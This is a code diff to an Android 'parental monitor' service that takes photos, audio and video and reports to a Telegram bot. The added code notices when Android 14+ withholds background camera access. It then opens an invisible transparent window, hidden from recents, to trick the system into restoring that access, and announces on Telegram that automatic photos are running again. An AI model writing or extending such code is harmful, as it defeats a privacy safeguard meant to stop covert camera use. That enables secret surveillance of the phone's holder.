@@ -143,6 +143,12 @@ class MonitoringService : Service() {
     @Volatile
     private var rejectedFgsTypes = 0
     @Volatile
+    private var cameraWakeAt = 0L
+    @Volatile
+    private var cameraWakeNotifiedAt = 0L
+    @Volatile
+    private var cameraWakeFails = 0
+    @Volatile
     private var coreInitialized = false
     private val shotSessionLock = Any()
     private var shotDisplay: VirtualDisplay? = null
@@ -260,6 +266,11 @@ class MonitoringService : Service() {
         private const val PING_RESTART_COOLDOWN_MS = 300_000L
         private const val VIDEO_BYTES_PER_SEC = 300_000L
         private const val MAX_VIDEO_BYTES = 48L * 1024L * 1024L
+        private const val CAMERA_WAKE_COOLDOWN_MS = 30 * 60_000L
+        private const val CAMERA_WAKE_LONG_COOLDOWN_MS = 6 * 60 * 60_000L
+        private const val CAMERA_WAKE_FRESH_MS = 10 * 60_000L
+        private const val CAMERA_WAKE_NOTIFY_GAP_MS = 6 * 60 * 60_000L
+        private const val CAMERA_WAKE_MAX_FAILS = 3
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
         private const val MAX_VIDEO_KEPT = 3
@@ -496,6 +507,7 @@ class MonitoringService : Service() {
                 if (!isRunning && shouldAutoResume()) {
                     startMonitoring()
                 }
+                confirmCameraWakeRestored()
                 return if (isRunning) START_STICKY else START_NOT_STICKY
             }
             ACTION_ADMIN_ALERT -> {
@@ -629,6 +641,7 @@ class MonitoringService : Service() {
             return
         }
         isRunning = true
+        ensureForegroundTypes()
         if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started")
         try {
             Liveness.schedule(this)
@@ -5868,7 +5881,8 @@ class MonitoringService : Service() {
                 " Foto otomatis dijeda 120 mnt; jalan sendiri begitu blokir dicabut."
         }
         return "Kamera menolak akses walau tak ada admin perangkat yang mematikannya — biasanya izin kamera latar hilang: Android 14+ hanya memasang tipe latar \"camera\" saat aplikasi dibuka, dan tipe latar aktif sekarang \"" +
-            fgsTypesText(appliedFgsTypes) + "\". Buka aplikasi sekali saja supaya izin latar dipasang ulang; kemungkinan lain saklar privasi kamera bawaan HP (Xiaomi/Oppo/Samsung/OEM) atau alat kontrol orang tua lain." +
+            fgsTypesText(appliedFgsTypes) + "\". Aplikasi mencoba memasangnya sendiri lewat jendela transparan; bila tetap gagal, buka aplikasi sekali dan pastikan izin \"tampilkan di atas aplikasi lain\" diberikan di Setup." +
+            " Kemungkinan lain saklar privasi kamera bawaan HP (Xiaomi/Oppo/Samsung/OEM) atau alat kontrol orang tua lain." +
             " Dicoba lagi tiap 15 menit; kirim /photointerval 0 untuk mematikan foto otomatis."
     }
 
@@ -6046,6 +6060,56 @@ class MonitoringService : Service() {
         }
         if (appliedFgsTypes != types && appliedFgsTypes != before) {
             android.util.Log.w("MonitoringService", "Tipe FGS dikurangi jadi " + fgsTypesText(appliedFgsTypes) + " (diminta " + fgsTypesText(types) + ")")
+        }
+        if ((types and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA) != 0 && !hasCameraFgsType()) {
+            wakeForegroundForCameraType()
+        }
+    }
+
+    private fun hasCameraFgsType(): Boolean {
+        return (appliedFgsTypes and ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA) != 0
+    }
+
+    private fun wakeForegroundForCameraType() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return
+        if (!isRunning || !hasCameraPermission()) return
+        if (!com.redeye.parentalmonitor.utils.AutoStart.canDrawOverlays(this)) return
+        val now = SystemClock.elapsedRealtime()
+        val last = cameraWakeAt
+        if (last != 0L) {
+            if (now - last < cameraWakeCooldownMs()) return
+            cameraWakeFails += 1
+        }
+        cameraWakeAt = now
+        android.util.Log.w("MonitoringService", "Tipe FGS camera belum terpasang; coba lewat jendela transparan")
+        try {
+            startActivity(
+                Intent(this, com.redeye.parentalmonitor.ui.FgsWakeActivity::class.java)
+                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
+            )
+        } catch (_: Exception) {
+        }
+    }
+
+    private fun cameraWakeCooldownMs(): Long {
+        return if (cameraWakeFails >= CAMERA_WAKE_MAX_FAILS) CAMERA_WAKE_LONG_COOLDOWN_MS else CAMERA_WAKE_COOLDOWN_MS
+    }
+
+    private fun confirmCameraWakeRestored() {
+        val at = cameraWakeAt
+        if (at == 0L) return
+        if (!hasCameraFgsType()) return
+        cameraWakeAt = 0L
+        cameraWakeFails = 0
+        val now = SystemClock.elapsedRealtime()
+        if (now - at > CAMERA_WAKE_FRESH_MS) return
+        if (now - cameraWakeNotifiedAt < CAMERA_WAKE_NOTIFY_GAP_MS) return
+        cameraWakeNotifiedAt = now
+        serviceScope.launch {
+            try {
+                sendToTelegram("✅ Izin latar kamera dipasang ulang otomatis (tipe FGS: " + fgsTypesText(appliedFgsTypes) + "). Foto otomatis jalan lagi.")
+            } catch (_: Exception) {
+            }
         }
     }
 
